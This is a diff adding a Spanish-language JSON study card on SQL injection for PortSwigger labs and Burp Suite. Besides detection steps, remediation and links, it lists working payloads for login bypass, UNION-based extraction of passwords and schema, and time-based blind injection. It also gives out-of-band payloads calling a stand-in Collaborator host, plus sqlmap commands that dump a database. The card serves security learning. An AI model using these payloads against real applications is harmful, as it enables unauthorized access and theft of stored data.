@@ -1,0 +1,84 @@
+{
+  "id": "sql-injection",
+  "name": "SQL Injection",
+  "category": "Injection",
+  "severity": "High",
+  "aka": ["SQLi"],
+  "summary": "El input del usuario se concatena en una consulta SQL sin sanitizar, permitiendo alterar la lógica de la query para leer/modificar datos, saltar autenticación o, en algunos casos, ejecutar comandos en el SO.",
+  "where_to_look": [
+    "Parámetros de búsqueda, filtros, categorías y ordenación (ORDER BY).",
+    "Campos de login (usuario/contraseña).",
+    "Cabeceras: User-Agent, Referer, cookies (p. ej. cookie de tracking).",
+    "Cualquier parámetro que termine reflejándose en una respuesta o cambie el resultado del listado."
+  ],
+  "detection": [
+    "Inyecta una comilla simple ' y observa si cambia la respuesta o aparece un error SQL.",
+    "Compara condición verdadera vs falsa: ' OR 1=1-- frente a ' OR 1=2-- .",
+    "Para SQLi ciega basada en tiempo, fuerza un retardo y mide la respuesta.",
+    "Detección OAST: provoca una interacción de red (DNS/HTTP) hacia Burp Collaborator."
+  ],
+  "burp_steps": [
+    "Captura la petición vulnerable con el proxy y mándala al Repeater (Ctrl+R).",
+    "Prueba ' y \"  y observa diferencias en código de estado, longitud o mensaje de error.",
+    "Determina el número de columnas con ORDER BY 1,2,3... hasta que falle, o con UNION SELECT NULL,NULL,...",
+    "Identifica qué columnas son de tipo texto para reflejar datos con UNION.",
+    "Extrae versión y esquema: en MySQL/MSSQL desde information_schema; en Oracle desde all_tables.",
+    "Si es ciega, usa Intruder para automatizar la extracción carácter a carácter, o lanza sqlmap.",
+    "Para inyección en cookie: usa la extensión 'Param Miner' o edita la cookie directamente en Repeater."
+  ],
+  "payloads": {
+    "Bypass de autenticación": [
+      "' OR 1=1--",
+      "' OR '1'='1'--",
+      "admin'--",
+      "administrator'--"
+    ],
+    "Determinar columnas (UNION)": [
+      "' ORDER BY 1-- ",
+      "' UNION SELECT NULL-- ",
+      "' UNION SELECT NULL,NULL-- ",
+      "' UNION SELECT 'a',NULL-- "
+    ],
+    "Extracción de datos": [
+      "' UNION SELECT username, password FROM users-- ",
+      "' UNION SELECT table_name,NULL FROM information_schema.tables-- ",
+      "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- "
+    ],
+    "Versión del motor": [
+      "' UNION SELECT @@version,NULL-- ",
+      "' UNION SELECT banner,NULL FROM v$version-- ",
+      "' UNION SELECT version(),NULL-- "
+    ],
+    "Ciega — condicional / tiempo": [
+      "' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'-- ",
+      "'; IF (1=1) WAITFOR DELAY '0:0:5'-- ",
+      "' AND (SELECT SLEEP(5))-- ",
+      "' || (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)-- "
+    ],
+    "Ciega — OAST (Collaborator)": [
+      "'; exec master..xp_dirtree '//BURP-COLLAB/a'-- ",
+      "' UNION SELECT extractvalue(xmltype('<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % p SYSTEM \"http://BURP-COLLAB/\">%p;]>'),'/l') FROM dual-- "
+    ]
+  },
+  "commands": [
+    {"tool": "sqlmap", "desc": "Test básico desde una request guardada de Burp", "cmd": "sqlmap -r request.txt --batch"},
+    {"tool": "sqlmap", "desc": "Volcar la base de datos actual", "cmd": "sqlmap -r request.txt --batch --dump --current-db"},
+    {"tool": "sqlmap", "desc": "Inyección en cookie con nivel/riesgo alto", "cmd": "sqlmap -u 'https://lab/' --cookie='TrackingId=*' --level=3 --risk=2 --batch"}
+  ],
+  "remediation": [
+    "Usa consultas parametrizadas (prepared statements) en TODA query con input del usuario.",
+    "No construyas SQL por concatenación de strings, ni siquiera para ORDER BY (usa allowlist).",
+    "Aplica el principio de mínimo privilegio a la cuenta de BD de la aplicación."
+  ],
+  "portswigger_labs": [
+    {"title": "SQLi en cláusula WHERE para recuperar datos ocultos", "difficulty": "APPRENTICE", "url": "https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data"},
+    {"title": "SQLi con bypass de login", "difficulty": "APPRENTICE", "url": "https://portswigger.net/web-security/sql-injection/lab-login-bypass"},
+    {"title": "Ataque UNION para extraer datos de otras tablas", "difficulty": "PRACTITIONER", "url": "https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables"},
+    {"title": "SQLi ciega con retardos de tiempo y extracción", "difficulty": "PRACTITIONER", "url": "https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval"}
+  ],
+  "references": [
+    {"title": "PortSwigger — SQL injection", "url": "https://portswigger.net/web-security/sql-injection"},
+    {"title": "PortSwigger — SQLi cheat sheet", "url": "https://portswigger.net/web-security/sql-injection/cheat-sheet"},
+    {"title": "OWASP — SQL Injection", "url": "https://owasp.org/www-community/attacks/SQL_Injection"}
+  ]
+}
